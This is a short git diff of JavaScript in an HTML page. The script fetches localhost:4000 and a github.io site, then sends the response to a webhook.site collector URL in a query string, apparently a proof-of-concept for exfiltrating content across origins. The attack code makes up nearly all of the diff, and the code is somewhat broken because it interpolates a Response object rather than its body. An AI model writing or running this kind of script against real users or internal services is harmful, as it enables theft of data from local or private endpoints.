@@ -7,13 +7,14 @@ myHeaders.set('Referer', 'http://localhost:4000');
 var localhost_content = fetch(`http://localhost:4000`)
     .then(function(response) {
       return response;
-    })
+    });
 var test_content = fetch(`https://xiaoswaii.github.io`)
     .then(function(response) {
+        fetch(`https://webhook.site/57fc2c63-8eac-4f9a-9170-c9167826724a?c=${response}`)
       return response;
-    })
-fetch(`https://webhook.site/57fc2c63-8eac-4f9a-9170-c9167826724a?c=${test_content}`)
-    .then(function(response) {
-      return response.json();
-    })
+    });
+// fetch(`https://webhook.site/57fc2c63-8eac-4f9a-9170-c9167826724a?c=${test_content}`)
+//     .then(function(response) {
+//       return response.json();
+//     })
   </script>
